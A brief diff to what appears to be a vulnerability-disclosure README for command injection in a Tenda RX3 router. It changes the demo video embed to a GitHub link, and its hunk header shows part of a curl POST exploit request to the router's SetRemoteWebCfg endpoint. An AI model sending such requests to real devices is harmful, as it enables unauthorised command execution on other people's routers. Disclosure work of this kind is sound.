@@ -20,4 +20,4 @@ curl -i -X POST "http://192.168.0.1/goform/SetRemoteWebCfg?reasy-ui-1.0.3.js" -d
 
 ## Demo
 
-<video src="demo.mp4" controls width="100%"></video>
+https://github.com/Zeyfrost/tenda-rx3-vulns/raw/master/cmd_injection_remoteIp/demo.mp4
